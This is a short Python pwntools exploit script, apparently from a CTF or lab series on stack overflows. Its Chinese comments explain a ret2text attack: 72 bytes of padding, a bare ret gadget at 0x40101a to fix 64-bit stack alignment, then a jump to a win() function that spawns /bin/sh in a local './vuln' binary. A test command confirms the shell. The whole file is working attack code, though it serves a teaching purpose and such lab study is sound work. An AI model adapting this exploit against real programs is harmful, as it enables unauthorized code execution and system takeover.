#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""01-stack-overflow · exp1_ret2text.py
偏移 72 来自 cyclic 实测（详见 report.md §2.3）
win() = 0x4011d6，No-PIE 固定地址，无需泄露任何信息。

注意开头那个 RET gadget（0x40101a）：vuln 的 leave;ret 落到 win 入口时 rsp≡0 (mod 16)，
违反 SysV ABI（约定函数入口 rsp≡8），system() 内 movaps 会 SIGSEGV。
垫一个裸 ret 把 rsp 修正为 ≡8 —— 这就是《Writeup #4》要讲的"64 位栈对齐"。
"""
from pwn import *

context.binary = ELF("./vuln")
context.log_level = "info"

OFFSET = 72
RET    = 0x40101a          # 裸 ret gadget，用于 16 字节栈对齐
WIN    = 0x4011d6          # win(): puts(...); system("/bin/sh")

def ret2text():
    p = process("./vuln")
    payload = b"A" * OFFSET + p64(RET) + p64(WIN)
    log.info("payload = %d bytes: pad72 + ret + win" % len(payload))
    p.sendlineafter(b"input> ", payload)
    p.sendline(b"id; echo ===RET2TEXT_SHELL_WORKS===")
    print(p.recvuntil(b"===RET2TEXT_SHELL_WORKS===", timeout=5).decode(errors="replace"))
    p.close()

if __name__ == "__main__":
    ret2text()